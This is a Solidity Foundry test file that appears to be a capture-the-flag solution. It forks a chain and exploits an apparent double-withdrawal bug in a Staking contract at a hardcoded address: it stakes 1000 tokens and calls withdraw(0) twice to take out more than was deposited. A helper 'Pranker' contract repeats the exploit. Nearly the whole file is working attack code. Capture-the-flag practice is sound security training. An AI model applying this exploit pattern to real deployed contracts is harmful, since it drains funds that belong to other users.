// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";

contract CTFTest1 is Test {
    uint256 pk;
    address user;
    string rpc;

    function setUp() public {
        pk = vm.envUint("PK");
        user = vm.envAddress("ADDR");
        rpc = vm.envString("RPC");

        vm.createSelectFork(rpc, 6600629 + 1);

        console.log("BLOCK", block.number);
        console.log("TIME ", block.timestamp);
        console.log();
    }

    function testCTF1() public {
        vm.startPrank(user);

        Staking staking = Staking(0xD6F79FFFDdb5b0dDd8F127976e1a836189FcbBB5);
        IERC20 token = IERC20(0xF3aF54943d6ef98c2B083FC6e69d36019ee5459D);

        console.log(token.balanceOf(user));



        // ATTACK
        token.approve(address(staking), type(uint256).max); // normal
        staking.stake(1000e18, 0); // deposits[msg.sender][_index] == 1000

        console.log(token.balanceOf(user));

        staking.withdraw(0); // deposits[msg.sender][_index] == 1000
        staking.withdraw(0); // deposits[msg.sender][_index] == 1000




        console.log(token.balanceOf(user));

        // console.log(token.balanceOf(user));

        // deal(address(token), user, 1000e18);

        // token.approve(address(staking), type(uint256).max);
        // staking.stake(1000e18, 0);
        // // console.log(token.balanceOf(user));
        // staking.withdraw(0);
        // // console.log(token.balanceOf(user));
        // staking.withdraw(0);
        
        // console.log(token.balanceOf(user));
        // Pranker pranker = new Pranker();
        // token.approve(address(pranker), type(uint256).max);
        // pranker.prank();
        // console.log(token.balanceOf(user));
    }
}

contract Pranker {
    constructor() {
        // 
    }

    function prank() external {
        Staking staking = Staking(0xD6F79FFFDdb5b0dDd8F127976e1a836189FcbBB5);
        IERC20 token = IERC20(0xF3aF54943d6ef98c2B083FC6e69d36019ee5459D);

        token.transferFrom(msg.sender, address(this), token.balanceOf(address(msg.sender)));

        token.approve(address(staking), type(uint256).max);
        staking.stake(1000e18, 0);
        // console.log(token.balanceOf(user));
        staking.withdraw(0);
        // console.log(token.balanceOf(user));
        staking.withdraw(0);
        token.transfer(msg.sender, token.balanceOf(address(this)));
        require(token.balanceOf(address(msg.sender)) >= uint(2e18));
    }
}

interface Staking {
    function stake(uint256 _amount, uint256 _lockupPeriod) external;
    function initiateWithdrawal(uint256 _index) external;
    function withdraw(uint256 _index) external;
}

interface IERC20 {
    function approve(address to, uint256 amount) external;
    function balanceOf(address user) external returns (uint256);
    function transfer(address, uint256) external;
    function transferFrom(address, address, uint256) external;
}